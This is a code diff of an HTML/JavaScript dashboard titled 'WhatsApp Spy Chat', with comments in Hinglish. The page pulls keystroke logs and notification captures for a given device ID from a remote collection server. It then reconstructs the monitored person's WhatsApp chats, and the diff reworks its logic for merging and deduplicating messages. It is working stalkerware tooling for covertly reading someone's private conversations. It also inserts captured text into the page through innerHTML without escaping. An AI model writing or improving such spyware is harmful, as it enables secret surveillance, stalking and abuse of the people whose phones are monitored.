@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Spy Chat (Incoming Fixed)</title>
+    <title>WhatsApp Spy Chat (Single Msg Only)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
@@ -32,11 +32,7 @@
         
         /* Bubbles */
         .msg { max-width: 65%; padding: 6px 10px; border-radius: 8px; font-size: 14.2px; position: relative; word-wrap: break-word; line-height: 1.4; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
-        
-        /* INCOMING (LEFT) */
         .msg.incoming { background: #202c33; align-self: flex-start; border-top-left-radius: 0; }
-        
-        /* OUTGOING (RIGHT) */
         .msg.outgoing { background: #005c4b; align-self: flex-end; border-top-right-radius: 0; }
 
         .msg-meta { display: flex; justify-content: flex-end; align-items: center; gap: 4px; margin-top: 2px; }
@@ -55,7 +51,7 @@
 
     <div class="sidebar" id="sidebar">
         <div class="sidebar-header">
-            <span>Chats <span style="font-size:10px; color:#00a884;">(Incoming Fixed)</span></span>
+            <span>Chats <span style="font-size:10px; color:#00a884;">(Live)</span></span>
             <i class="fas fa-trash-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#f15c6d;" title="Clear & Reset"></i>
         </div>
         <div class="contact-list" id="contactList">
@@ -78,7 +74,7 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
-        const STORAGE_KEY = `whatsapp_spy_final_v6_${deviceId}`; // Changed key for fresh start
+        const STORAGE_KEY = `whatsapp_spy_final_v4_${deviceId}`; // Changed key to reset bad data
 
         const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
         const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
@@ -102,7 +98,9 @@
         function sanitizeData() {
             Object.keys(allChats).forEach(user => {
                 allChats[user] = allChats[user].filter(m => m.time && !isNaN(new Date(m.time).getTime()));
-                allChats[user] = allChats[user].filter(m => !m.text.toLowerCase().includes("new messages"));
+                
+                // Extra check to remove old "group/stacked" messages from storage
+                allChats[user] = allChats[user].filter(m => !m.text.includes("new messages"));
 
                 const uniqueMsgs = [];
                 allChats[user].forEach(m => {
@@ -110,7 +108,7 @@
                         uniqueMsgs.push(m);
                     } else {
                         const last = uniqueMsgs[uniqueMsgs.length - 1];
-                        if (m.text === last.text && Math.abs(m.time - last.time) < 2000 && m.type === last.type) return; 
+                        if (m.text === last.text && Math.abs(m.time - last.time) < 2000) return; 
                         uniqueMsgs.push(m);
                     }
                 });
@@ -130,7 +128,7 @@
 
                 let hasNewData = false;
 
-                // Process Keylogs (Always Outgoing)
+                // Process Keylogs (Outgoing)
                 logs.forEach(item => {
                     if (isValidLog(item)) {
                         if(processMessage(item.title || "Unknown", item.text, item.timestamp, 'outgoing')) hasNewData = true;
@@ -157,10 +155,11 @@
             if(!item.text) return false;
             if(item.type === 'outgoing_keylog') return true;
             if(item.appName === 'WhatsApp' && !item.packageName) return true;
+            if(item.type === 'incoming_screen') return true;
             return false;
         }
 
-        // --- 4. MAIN LOGIC (INCOMING FIXED HERE) ---
+        // 4. MAIN LOGIC (Group Message Blocker)
         function processMessage(user, text, time, type) {
             if (!user || !text || text.trim() === "") return false;
             
@@ -168,43 +167,38 @@
             if (!ts || isNaN(new Date(ts).getTime())) return false; 
 
             if (user.includes("WhatsApp")) return false; 
+
+            // BLOCK SUMMARY MESSAGES (Like "3 new messages")
             if (text.toLowerCase().includes("new messages")) return false;
             if (text.toLowerCase().includes("incoming voice call")) return false;
 
             if (!allChats[user]) allChats[user] = [];
             const history = allChats[user];
+
             const lastMsg = history[history.length - 1];
 
-            // 1. Check Exact Duplicate
-            const alreadyExists = history.some(m => m.text === text && Math.abs(m.time - ts) < 5000 && m.type === type);
+            // --- STRICT "SINGLE MESSAGE" LOGIC ---
+            
+            // 1. Exact Duplicate Check
+            const alreadyExists = history.some(m => m.text === text && Math.abs(m.time - ts) < 5000);
             if (alreadyExists) return false;
 
-            // --- 🛑 FIX START: INCOMING STACKING ---
-            // Sirf incoming messages par ye rule lagega
-            if (type === 'incoming' && lastMsg && lastMsg.type === 'incoming') {
-                
-                // Case 1: Agar naya msg purane msg se start hota hai (e.g. "Hello" -> "Hello Kaise ho")
-                // To purana hissa kaat do aur sirf naya hissa save karo.
-                if (text.startsWith(lastMsg.text)) {
-                    let cleanText = text.substring(lastMsg.text.length).trim();
-                    if (cleanText === "") return false; // Agar katne ke baad kuch bacha hi nahi, to duplicate hai
-                    text = cleanText; // Update text
+            // 2. INCOMING GROUP/STACK BLOCKER (New Logic)
+            if (type === 'incoming' && lastMsg) {
+                // Agar naye message ke andar PURANA message chupa hai (matlab ye group notification hai)
+                // TO ISKO IGNORE KARO. (Kyuki single message pehle hi aa chuka hai)
+                if (text.includes(lastMsg.text) && text.length > lastMsg.text.length) {
+                    return false; // Stop the group message
                 }
                 
-                // Case 2: Agar naya msg pura ka pura purane msg me contained hai (Ualta case)
-                else if (lastMsg.text.includes(text)) {
-                    return false; // Ignore karo
-                }
-
-                // Case 3: Agar message me last msg ka text end me chipka hai (Junk)
-                else if (text.includes(lastMsg.text)) {
+                // Check for "..." which usually means summary
+                if (text.includes("...") && text.includes(lastMsg.text.substring(0, 5))) {
                     return false;
                 }
             }
-            // --- 🛑 FIX END ---
 
-            // Outgoing Logic (Untouched - Same as before)
-            if (type === 'outgoing' && lastMsg && lastMsg.type === 'outgoing') {
+            // 3. OUTGOING TYPING CORRECTION
+            if (type === 'outgoing' && lastMsg) {
                 const timeDiff = Math.abs(ts - lastMsg.time);
                 if (text.startsWith(lastMsg.text) && timeDiff < 10000) {
                     history.pop(); 
@@ -292,7 +286,7 @@
 
                 const tStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', hour12:false});
                 const div = document.createElement('div');
-                div.className = `msg ${m.type}`; 
+                div.className = `msg ${m.type}`;
                 div.innerHTML = `
                     ${m.text}
                     <div class="msg-meta">
